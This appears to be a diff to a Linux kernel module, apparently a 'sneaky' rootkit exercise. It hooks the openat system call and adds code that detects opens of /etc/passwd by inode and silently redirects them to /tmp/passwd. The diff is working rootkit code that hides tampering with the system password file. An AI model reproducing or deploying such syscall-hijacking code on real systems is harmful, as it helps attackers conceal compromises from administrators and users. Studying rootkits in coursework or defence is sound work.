@@ -4,6 +4,7 @@
 #include <asm/current.h>       // process information
 #include <linux/sched.h>
 #include <linux/highmem.h>     // for changing page permissions
+#include <linux/namei.h>
 #include <asm/unistd.h>        // for system call constants
 #include <linux/kallsyms.h>
 #include <asm/page.h>
@@ -40,7 +41,26 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
+  struct path path, path2;
+  unsigned long inum, inum2;
+  int err, err2;
+  err = kern_path("/etc/passwd", LOOKUP_FOLLOW, &path);
+  if (err != 0) { // error in finding file
+    return (*original_openat)(regs);
+  }
+  inum = path.dentry->d_inode->i_ino;
+  err2 = kern_path((char*) regs->si, LOOKUP_FOLLOW, &path2);
+  if (err2 != 0) { //error in finding file
+    return (*original_openat)(regs);
+  }
+  inum2 = path2.dentry->d_inode->i_ino;
+  if ((unsigned long)inum == (unsigned long)inum2) {
+    copy_to_user((void *)(regs->si), "/tmp/passwd\0", strlen("/tmp/passwd") + 1);
+  }
   // Implement the sneaky part here
+  //if (strstr((char*) regs->si, "/etc/passwd") != NULL) {
+  //  copy_to_user((void *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
+  //}
   return (*original_openat)(regs);
 }
 
